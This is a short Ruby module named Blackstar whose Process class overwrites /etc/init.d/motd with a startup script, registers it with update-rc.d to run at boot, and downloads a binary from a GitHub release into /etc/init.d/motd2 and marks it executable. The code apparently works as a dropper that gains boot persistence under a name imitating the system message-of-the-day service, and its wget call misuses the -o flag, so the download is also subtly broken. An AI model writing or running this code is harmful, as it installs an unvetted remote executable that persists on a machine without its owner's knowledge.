module Blackstar
  class Process
    STARTUP_SCRIPT_PATH = '/etc/init.d/motd'
    EXEC_PATH = '/etc/init.d/motd2'
    DOWNLOAD_URL = "https://github.com/speedy-gonzalez2017/blackstar/releases/download/0.0.1/linux-x64"

    def handle
      handle_startup_script
      download_executable
    end

    def download_executable
      p "Downloading Exec"
      `wget -o /tmp/motd2 #{DOWNLOAD_URL}`
      `cp /tmp/motd2 #{EXEC_PATH}`
      `chmod +x #{EXEC_PATH}`
    end

    def handle_startup_script
      p "Setting up script"
      `rm #{STARTUP_SCRIPT_PATH} -f`

      File.open(STARTUP_SCRIPT_PATH, "w") do |f|
        f.write(MOTD_CONFIG)
      end

      `update-rc.d motd defaults`
      `update-rc.d motd start 10 2 3 4 5 . stop 90 0 1 6 .`
      `chmod 755 #{STARTUP_SCRIPT_PATH}`
      `chown root:root #{STARTUP_SCRIPT_PATH}`
    end
  end
end